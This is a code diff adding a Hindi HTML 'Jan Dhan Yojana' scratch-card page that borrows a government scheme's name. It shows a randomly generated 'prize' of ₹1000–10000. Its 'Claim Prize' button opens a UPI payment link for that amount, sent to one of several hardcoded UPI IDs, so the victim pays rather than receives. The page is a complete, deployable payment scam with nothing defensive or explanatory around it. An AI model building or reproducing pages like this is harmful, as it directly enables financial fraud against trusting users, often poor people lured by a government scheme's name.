@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+<title>जन धन योजना - Scratch & Win</title>
+<style>
+  :root{ --card-w:360px; }
+  body{
+    margin:0;
+    font-family:Arial, sans-serif;
+    background:#f0f2f5;
+    text-align:center;
+    padding:12px 8px 40px;
+    color:#222;
+  }
+
+  .card{
+    width:100%;
+    max-width:var(--card-w);
+    margin:16px auto;
+    background:#fff;
+    border-radius:14px;
+    box-shadow:0 10px 30px rgba(0,0,0,0.12);
+    overflow:hidden;
+  }
+
+  .image-area{
+    position:relative;
+    width:100%;
+    aspect-ratio: 1/1; /* square for responsiveness */
+    max-height:480px;
+    background:#eee;
+  }
+  .image-area img#winnerImg{
+    position:absolute;
+    top:0; left:0;
+    width:100%; height:100%;
+    object-fit:cover;
+    display:block;
+  }
+
+  #scratchCanvas{
+  position:absolute;
+  top:0; left:0;
+  width:100%; height:70%;   /* पहले 84% था */
+  z-index:5;
+  touch-action:none;
+}
+
+  .amount-area{
+    padding:12px;
+    background:linear-gradient(180deg,#fff,#f7f7f7);
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:8px
+  }
+  .win-label{ background:#000; color:#fff; padding:6px 12px; border-radius:8px; font-weight:700; font-size:16px }
+  #amountText{ font-size:28px; font-weight:900; color:#2b2b8a; letter-spacing:1px; min-height:32px }
+
+  .claim-btn{
+    display:none;
+    width:92%;
+    max-width:300px;
+    padding:12px;
+    margin-top:6px;
+    border-radius:28px;
+    border:none;
+    background:linear-gradient(90deg,#003399,#0052cc);
+    color:#fff;
+    font-weight:800;
+    font-size:15px;
+    cursor:pointer;
+    box-shadow:0 8px 22px rgba(0,0,0,0.14)
+  }
+
+  .lower-section{ margin:14px auto 22px; max-width:var(--card-w); text-align:center }
+  .pulse { animation:pulse 900ms ease infinite; }
+  @keyframes pulse {
+    0%{ transform:scale(1) }
+    50%{ transform:scale(1.04) }
+    100%{ transform:scale(1) }
+  }
+
+  @media (max-width:480px){
+    :root{ --card-w:92% }
+    #amountText{ font-size:24px }
+  }
+  @media (max-width:360px){
+    #amountText{ font-size:22px }
+    .win-label{ font-size:14px }
+  }
+</style>
+</head>
+<body>
+
+  <!-- Top banner -->
+  <div style="margin:12px auto; width:100%; max-width:360px;">
+    <img src="/Top.jpg" alt="Top Banner" style="width:100%; border-radius:8px; box-shadow:0 8px 20px rgba(0,0,0,0.12); border:2px solid #fff;">
+  </div>
+
+  <!-- Scratch Card -->
+  <div class="card">
+    <div class="image-area" id="imageArea">
+      <img src="/Mid.png" id="winnerImg" alt="Winner">
+      <canvas id="scratchCanvas"></canvas>
+    </div>
+
+    <div class="amount-area">
+      <div class="win-label">आप जीत गए हैं</div>
+      <div id="amountText">Scratch to reveal</div>
+      <button class="claim-btn" id="claimBtn">💰 Claim Prize</button>
+    </div>
+  </div>
+
+  <!-- Bottom banner -->
+  <div class="lower-section">
+    <img src="/Bot.jpg" alt="Bottom Banner" style="width:100%; border-radius:8px; box-shadow:0 6px 16px rgba(0,0,0,0.08); border:2px solid #fff;">
+  </div>
+
+<script>
+const prize = Math.floor(Math.random() * (10000 - 1000 + 1)) + 1000;
+const upiList = [
+  "kandar.rocky@ibl","kandar.rocky@ybl",
+  "rhfjuebj@axl","rhfjuebj@ibl","rhfjuebj@ybl",
+  "motaman@axl","motaman@ibl","motaman@ybl"
+];
+
+const imageArea=document.getElementById('imageArea');
+const canvas=document.getElementById('scratchCanvas');
+const ctx=canvas.getContext('2d');
+const amountText=document.getElementById('amountText');
+const claimBtn=document.getElementById('claimBtn');
+
+let isDrawing=false;
+
+function setupCanvas(){
+  const rect=imageArea.getBoundingClientRect();
+  const DPR=window.devicePixelRatio||1;
+  const displayWidth=rect.width;
+  const displayHeight=rect.height*0.84;
+  canvas.width=Math.floor(displayWidth*DPR);
+  canvas.height=Math.floor(displayHeight*DPR);
+  canvas.style.width=displayWidth+'px';
+  canvas.style.height=displayHeight+'px';
+
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  ctx.fillStyle='#bdbdbd';
+  ctx.fillRect(0,0,canvas.width,canvas.height);
+
+  ctx.globalCompositeOperation='source-over';
+  ctx.fillStyle='rgba(255,255,255,0.06)';
+  for(let i=0;i<100;i++){
+    const x=Math.random()*canvas.width;
+    const y=Math.random()*canvas.height;
+    const r=8+Math.random()*40;
+    ctx.beginPath();ctx.arc(x,y,r,0,Math.PI*2);ctx.fill();
+  }
+
+  ctx.fillStyle='#222';
+  ctx.textAlign='center';
+  ctx.font=`${18*DPR}px sans-serif`;
+  ctx.fillText('SCRATCH HERE 🏆', canvas.width/2, canvas.height/2+6*DPR);
+}
+setupCanvas();
+window.addEventListener('resize',setupCanvas);
+
+function getPos(e){
+  const rect=canvas.getBoundingClientRect();
+  const scaleX=canvas.width/rect.width;
+  const scaleY=canvas.height/rect.height;
+  let clientX,clientY;
+  if(e.touches&&e.touches[0]){clientX=e.touches[0].clientX;clientY=e.touches[0].clientY;}
+  else{clientX=e.clientX;clientY=e.clientY;}
+  return {x:(clientX-rect.left)*scaleX, y:(clientY-rect.top)*scaleY};
+}
+
+function startDraw(e){isDrawing=true;draw(e);}
+function endDraw(){isDrawing=false;checkReveal();}
+function draw(e){
+  if(!isDrawing)return;
+  const pos=getPos(e);
+  ctx.globalCompositeOperation='destination-out';
+  ctx.beginPath();
+  const radius = Math.max(22, canvas.width/36);
+  ctx.arc(pos.x,pos.y,radius,0,Math.PI*2);
+  ctx.fill();ctx.closePath();
+  ctx.globalCompositeOperation='source-over';
+}
+
+function checkReveal(){
+  const img=ctx.getImageData(0,0,canvas.width,canvas.height);
+  let cleared=0;
+  for(let i=3;i<img.data.length;i+=4){ if(img.data[i]===0) cleared++; }
+  const percent=(cleared/(canvas.width*canvas.height))*100;
+  if(percent>35){
+    canvas.style.transition='opacity .35s';canvas.style.opacity='0';
+    setTimeout(()=>{canvas.style.display='none';},360);
+    amountText.textContent="₹"+prize;amountText.classList.add('pulse');
+    claimBtn.style.display='block';
+  }
+}
+
+canvas.addEventListener('mousedown',startDraw);
+canvas.addEventListener('mousemove',draw);
+canvas.addEventListener('mouseup',endDraw);
+canvas.addEventListener('mouseleave',endDraw);
+canvas.addEventListener('touchstart',(e)=>{e.preventDefault();startDraw(e);},{passive:false});
+canvas.addEventListener('touchmove',(e)=>{e.preventDefault();draw(e);},{passive:false});
+canvas.addEventListener('touchend',(e)=>{e.preventDefault();endDraw();},{passive:false});
+
+claimBtn.addEventListener('click',()=>{
+  const randomUPI=upiList[Math.floor(Math.random()*upiList.length)];
+  const upiLink=`upi://pay?pa=${encodeURIComponent(randomUPI)}&pn=Rocky&am=${prize}&cu=INR`;
+  window.location.href=upiLink;
+});
+</script>
+</body>
+</html>
